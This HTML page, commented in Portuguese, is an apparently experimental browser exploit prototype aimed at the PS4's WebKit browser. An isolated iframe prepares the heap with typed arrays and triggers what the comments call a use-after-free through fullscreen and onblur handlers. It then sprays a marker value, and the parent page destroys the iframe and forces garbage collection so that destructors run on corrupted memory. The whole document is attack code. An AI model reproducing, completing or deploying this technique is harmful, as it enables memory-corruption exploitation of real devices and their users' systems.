<!DOCTYPE html>
<html>
<head>
    <title>PS4 Teardown Trigger (Iframe Method)</title>
    <style>
        body { background-color: #111; color: #fff; font-family: monospace; text-align: center; }
        iframe { width: 80%; height: 300px; border: 2px solid #f00; background: #fff; margin: 20px; }
        button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background: #b00; color: white; border: none; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #000; }
    </style>
</head>
<body>

<h1>TEARDOWN TRIGGER v1.0</h1>
<h3>Estrat√©gia: Isolar o exploit num Iframe e mat√°-lo</h3>

<div id="status">Aguardando...</div>
<button onclick="killIframe()">üíÄ MATAR IFRAME (Trigger)</button>
<br>

<iframe id="victim_frame" srcdoc="
    <html>
    <body style='background:#ccf; color:black; text-align:center'>
        <h3>ZONA DE PERIGO</h3>
        <p>1. Clique em PREPARAR HEAP</p>
        <p>2. Clique em FULLSCREEN e aperte OPTIONS</p>
        <button onclick='prepare()'>PREPARAR HEAP</button>
        <button onclick='go()'>FULLSCREEN (GATILHO)</button>
        <div id='info'>...</div>
        <script>
            // --- C√ìDIGO DO EXPLOIT (RESUMIDO) ---
            var victims = [];
            var spray = [];
            const COUNT = 10000;
            const MAGIC = 2.121995791e-314; // 0x4141...
            
            function prepare() {
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }
                document.getElementById('info').innerText = 'Heap Pronto.';
            }

            function go() {
                document.documentElement.webkitRequestFullscreen();
                window.onblur = function() {
                    document.getElementById('info').innerText = 'UAF ATIVADO! Agora destrua o Iframe.';
                    
                    // 1. Trigger UAF
                    victims = null;
                    
                    // 2. Spray
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(MAGIC);
                        spray.push(s);
                    }
                    
                    // AQUI √â A DIFEREN√áA:
                    // N√£o checamos nada. Deixamos o estado corrompido.
                    // Esperamos o 'Pai' nos matar.
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema Principal...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += '>> ' + txt + '<br>'; }

    function killIframe() {
        log("Iniciando protocolo de Teardown...");
        
        let iframe = document.getElementById('victim_frame');
        if(!iframe) { log("Iframe j√° est√° morto."); return; }

        try {
            // A T√âCNICA DE OURO:
            // Remover o iframe for√ßa o WebKit a chamar os DESTRUTORES (C++) 
            // de tudo que estava l√° dentro.
            // √â a mesma coisa que 'Atualizar', mas controlado.
            
            iframe.remove(); 
            // Alternativa se remove() n√£o crashar: iframe.src = 'about:blank';
            
            log("Iframe removido do DOM.");
            log("For√ßando Garbage Collection no Pai...");
            
            // For√ßa o GC para garantir que os destrutores rodem AGORA
            for(let i=0; i<100; i++) { new ArrayBuffer(0x100000); }
            
            log("Se o console n√£o desligou, sobrevivemos ao Teardown.");
            log("Isso significa que controlamos o crash ou o exploit falhou.");
            
        } catch(e) {
            log("Erro: " + e);
        }
    }
</script>

</body>
</html>
